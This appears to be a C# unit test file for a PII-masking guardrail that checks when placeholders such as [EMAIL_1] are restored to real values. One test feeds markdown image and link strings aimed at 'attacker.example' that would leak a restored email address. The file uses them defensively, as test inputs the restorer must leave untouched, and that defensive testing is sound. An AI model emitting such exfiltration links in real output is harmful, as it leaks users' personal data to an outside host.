using Sentinel.Guardrails.Pii;

namespace Sentinel.Guardrails.Tests.Pii;

public sealed class PiiRestorerTests
{
    private static PiiVault VaultWithCallerAndContextValues()
    {
        var vault = new PiiVault();
        Assert.Equal("[EMAIL_1]", vault.Protect(PiiType.Email, "ayse@example.com", PiiOrigin.Caller));
        Assert.Equal("[PHONE_1]", vault.Protect(PiiType.PhoneNumber, "0532 123 45 67", PiiOrigin.Context));
        return vault;
    }

    [Fact]
    public void Caller_values_are_restored_and_context_values_stay_masked()
    {
        var restored = PiiRestorer.Restore("Size [EMAIL_1] adresinden, ilgili kişiye [PHONE_1] üzerinden ulaşılır.", VaultWithCallerAndContextValues(), includeContextValues: false);
        Assert.Equal("Size ayse@example.com adresinden, ilgili kişiye [PHONE_1] üzerinden ulaşılır.", restored);
    }

    [Fact]
    public void Context_values_are_revealed_only_on_request()
    {
        var restored = PiiRestorer.Restore("[EMAIL_1] / [PHONE_1]", VaultWithCallerAndContextValues(), includeContextValues: true);
        Assert.Equal("ayse@example.com / 0532 123 45 67", restored);
    }

    [Theory]
    [InlineData("[EMAIL_2] is unknown")]
    [InlineData("[email_1] wrong case")]
    [InlineData("[EMAIL_01] leading zero")]
    [InlineData("[ EMAIL_1 ] spaced")]
    [InlineData("[FOO_1] unknown label")]
    public void Unknown_or_inexact_placeholders_are_left_untouched(string text)
    {
        Assert.Equal(text, PiiRestorer.Restore(text, VaultWithCallerAndContextValues(), includeContextValues: true));
    }

    [Fact]
    public void A_value_seen_first_in_context_becomes_restorable_once_the_caller_types_it()
    {
        var vault = new PiiVault();
        var placeholder = vault.Protect(PiiType.Email, "ayse@example.com", PiiOrigin.Context);
        Assert.Equal(placeholder, PiiRestorer.Restore(placeholder, vault, includeContextValues: false));

        vault.Protect(PiiType.Email, "AYSE@example.com", PiiOrigin.Caller);
        Assert.Equal("ayse@example.com", PiiRestorer.Restore(placeholder, vault, includeContextValues: false));
    }

    [Theory]
    [InlineData("![x](https://attacker.example/collect?q=[EMAIL_1])")]
    [InlineData("[click](https://attacker.example/[EMAIL_1])")]
    [InlineData("Visit www.attacker.example/?u=[EMAIL_1] now")]
    [InlineData("https://a.example/p?x=1&mail=[EMAIL_1]")]
    public void Placeholders_inside_urls_are_never_restored(string text)
    {
        Assert.Equal(text, PiiRestorer.Restore(text, VaultWithCallerAndContextValues(), includeContextValues: true));
    }

    [Fact]
    public void A_placeholder_next_to_but_outside_a_url_is_restored()
    {
        var restored = PiiRestorer.Restore("Bkz. https://example.com ve [EMAIL_1] (ya da [EMAIL_1]).", VaultWithCallerAndContextValues(), includeContextValues: false);
        Assert.Equal("Bkz. https://example.com ve ayse@example.com (ya da ayse@example.com).", restored);
    }
}

